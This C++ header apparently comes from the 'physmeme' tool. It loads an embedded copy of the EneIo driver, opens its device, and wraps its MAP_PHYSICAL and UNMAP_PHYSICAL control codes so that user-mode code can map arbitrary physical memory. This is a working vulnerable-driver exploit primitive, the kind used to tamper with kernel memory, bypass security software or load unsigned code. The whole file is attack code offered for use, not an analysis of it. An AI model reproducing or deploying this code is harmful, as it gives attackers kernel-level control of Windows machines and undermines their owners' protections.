#pragma once
#include <windows.h>
#include <cstdint>

#include "../util/util.hpp"
#include "../loadup.hpp"
#include "../raw_driver.hpp"

#define MAP_PHYSICAL 0x80102040
#define UNMAP_PHYSICAL 0x80102044

#pragma pack ( push, 1 )
typedef struct _GIOMAP
{
	unsigned long	interface_type;
	unsigned long	bus;
	std::uintptr_t  physical_address;
	unsigned long	io_space;
	unsigned long	size;
} GIOMAP;
#pragma pack ( pop )

struct tagPhysStruct
{
	DWORD64 dwPhysMemSizeInBytes;
	DWORD64 pvPhysAddress;
	DWORD64 PhysicalMemoryHandle;
	DWORD64 pvPhysMemLin;
	DWORD64 pvPhysSection;
};

namespace physmeme
{
	inline std::string drv_key;
	inline HANDLE drv_handle = NULL;

	inline bool load_drv()
	{
		const auto [result, key] =
			driver::load(
				raw_driver,
				sizeof(raw_driver)
			);

		drv_key = key;
		drv_handle = CreateFileA(
			"\\\\.\\EneIo",
			GENERIC_READ | GENERIC_WRITE,
			NULL,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		if (drv_handle == INVALID_HANDLE_VALUE) {
			printf("[-] Could not load EneIo: 0x%x", GetLastError());
		}
		return drv_handle;
	}

	inline bool unload_drv()
	{
		return CloseHandle(drv_handle) && driver::unload(drv_key);
	}

	inline std::uintptr_t map_phys(std::uintptr_t addr, std::size_t size)
	{
		//--- ensure the validity of the address we are going to try and map
		if (!util::is_valid(addr))
			return NULL;

		tagPhysStruct in_buffer = { 0 };
		in_buffer.dwPhysMemSizeInBytes = size;
		in_buffer.pvPhysAddress = addr;
		unsigned long returned = 0;

		if (!DeviceIoControl(
			drv_handle,
			MAP_PHYSICAL,
			reinterpret_cast<LPVOID>(&in_buffer),
			sizeof(in_buffer),
			reinterpret_cast<LPVOID>(&in_buffer),
			sizeof(in_buffer),
			&returned, NULL
		))
			return NULL;

		return in_buffer.pvPhysMemLin;
	}

	inline bool unmap_phys(std::uintptr_t addr, std::size_t size)
	{
		tagPhysStruct in_buffer = { 0 };
		in_buffer.pvPhysAddress = addr;
		in_buffer.dwPhysMemSizeInBytes = size;
		unsigned long returned = NULL;

		return DeviceIoControl(
			drv_handle,
			UNMAP_PHYSICAL,
			reinterpret_cast<LPVOID>(&in_buffer),
			sizeof(in_buffer),
			reinterpret_cast<LPVOID>(&in_buffer),
			sizeof(in_buffer),
			&returned, NULL
		);
	}
}